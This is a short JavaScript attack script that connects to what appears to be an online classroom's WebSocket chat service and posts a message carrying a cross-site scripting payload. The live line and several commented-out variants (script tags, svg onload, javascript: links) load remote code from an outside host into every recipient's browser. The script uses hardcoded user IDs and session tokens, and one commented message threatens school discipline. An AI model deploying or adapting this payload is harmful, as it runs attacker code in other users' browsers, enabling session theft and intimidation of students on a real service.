/*
plan_id	635803
user_from_id	10794780
user_from_token	"c8f0d065cce10e8fffe6fef8e0e9c12e"
message_type	"text"
type	1
device_type	10
content	"ç¾¤é\u0087\u008cæ\u009c\u0089äº\u008cå\u0088ºè\u009e\u0088å\u0090\u0097"
unique_id	1581342173970
*/

var myws = new WebSocket("wss://message.yunke.com/message.plan.ws?getOnlineUserSignal=0")
//var payload = `<a href="javascript:function ttt(){;var newJs=document.createElement('script');newJs.type='text/javascript';newJs.src='https://jssrc.mkaliez.com/payload.js';document.getElementsByTagName('head')[0].appendChild(newJs);;}ttt()">clickme</a>`;
//var payload = `<svg onload="javascript:function ttt(){;var newJs=document.createElement('script');newJs.type='text/javascript';newJs.src='https://jssrc.mkaliez.com/payload4.js';document.getElementsByTagName('head')[0].appendChild(newJs);;}ttt()"></svg>`;
//var payload = `%3cimg+src%3d%22https%3a%2f%2fjssrc.mkaliez.com%2frunnie3.jpg%22%3e%3c%2fimg%3e`;
//var payload = `<script>function ttt(){;var newJs=document.createElement('script');newJs.type='text/javascript';newJs.src='https://jssrc.mkaliez.com/payload5.js';document.getElementsByTagName('head')[0].appendChild(newJs);;}ttt()</script>`;
var payload = `<script src="https://jssrc.mkaliez.com/reload.js" style`;
//var payload = `否则将受到校级处分`;
var jsondata = {};
jsondata.plan_id = 636174;
jsondata.user_from_id = 10794780;
jsondata.user_from_token = "586cacbacbb2d7a08f622022f9aadbac";
jsondata.message_type = "text";
jsondata.device_type = 10;
jsondata.content = payload;
jsondata.unique_id = 1581475179786;

//var rawContent = `{"plan_id":635803,"user_from_id":10794780,"user_from_token":"98f2c990163779d5c27fa1ecd4374ddb","message_type":"text","type":1,"device_type":10,"content":"` + payload + `","unique_id":1581336148667}`;
var rawContent = JSON.stringify(jsondata);
myws.onopen = () => {
    myws.send(rawContent);
}